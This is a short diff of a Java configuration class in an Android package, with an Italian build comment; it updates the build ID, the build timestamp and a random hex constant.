@@ -3,8 +3,8 @@ package com.android.service.auto;
 public class Cfg {
 	//ATTENZIONE, NON CAMBIARE A MANO LA VARIABILE DEBUG, VIENE RISCRITTA DA ANT
 	
-    public static final int BUILD_ID = 19;
-    public static final String BUILD_TIMESTAMP = "20120622-112614";
+    public static final int BUILD_ID = 21;
+    public static final String BUILD_TIMESTAMP = "20120622-122816";
     
     public static final int VERSION = 2012070101;
 	public static final String OSVERSION = "default";
@@ -19,5 +19,5 @@ public class Cfg {
 	public static final boolean FILE = true;
 	public static final boolean MICFILE = false;
 	
-	public static final String RANDOM = "2480661EDAC46D82";
+	public static final String RANDOM = "98CE05CAD37B7C13";
 }
